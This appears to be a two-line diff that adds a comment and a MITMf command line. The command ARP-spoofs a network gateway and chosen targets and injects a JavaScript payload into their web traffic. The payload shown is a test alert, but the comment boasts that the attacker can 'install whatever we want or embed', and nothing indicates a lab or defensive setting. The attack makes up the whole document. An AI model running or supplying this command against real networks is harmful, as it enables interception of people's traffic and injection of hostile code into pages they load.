@@ -1,0 +1,2 @@
+//Since we are counted as the router we can install whatever we want or embed
+mitmf --arp --spoof --gateway (ROUTERIP) --targets (TARGETSIP) -i (INTERFACE) --inject --js-payload "alert('test');"
